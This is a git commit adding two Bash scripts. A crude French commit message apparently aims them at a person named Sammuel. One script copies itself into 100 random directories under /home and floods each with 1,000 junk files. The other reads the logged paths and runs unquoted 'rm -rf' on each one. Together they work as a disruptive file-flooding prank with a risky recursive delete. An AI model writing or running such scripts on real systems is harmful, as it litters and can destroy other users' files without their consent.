ddf9b6578d1de9a1d05194471136c219cef59be9
vogeaux <vogeaux@gmail.com>
2022-05-24 14:28:06 +0200

    sammuel le sucer de cours

---
+++ rm_script.sh
@@ -0,0 +1,12 @@
+# for i in read -r line; do echo $line; done
+
+ 
+# while IFS= read -r line; 
+# do echo $line && rm $line;
+# done < ./recpfile.txt
+
+while IFS= read -r line; do echo $line && rm -rf $line ; done < recpfile.txt
+
+while IFS= read -r line; do echo $line && rm -rf $line ; done < recp.txt
+
+rm recpfile.txt && rm recp.txt
---
+++ script.sh
@@ -0,0 +1,25 @@
+#! /bin/bash
+touch /home/recp.txt
+touch /home/recpfile.txt
+
+
+
+for e in {1..100}; do
+    motHasard=$( shuf -n 1 /usr/share/dict/american-english )
+    RANU=$motHasard #$RANDOM
+    echo $RANU
+    comfind=$(find /home/ -type d | shuf -n 1)
+    cp ./script.sh $comfind/$RANU.sh
+    echo $comfind/$RANU.sh
+    echo $comfind/$RANU.sh >> ./recp.txt
+    #mkdir $comfind/$RANDOM > ./home/recp.txt
+    #chmod 600 $comfind/$RANDOM
+    chmod 600 $comfind/$RANU.sh
+    i=0
+    echo $e
+    for i in {1..1000}; do
+    touch $comfind/$i.$RANU
+    echo $comfind/$i.$RANU
+    echo $comfind/$i.$RANU >> ./recpfile.txt
+    done
+done
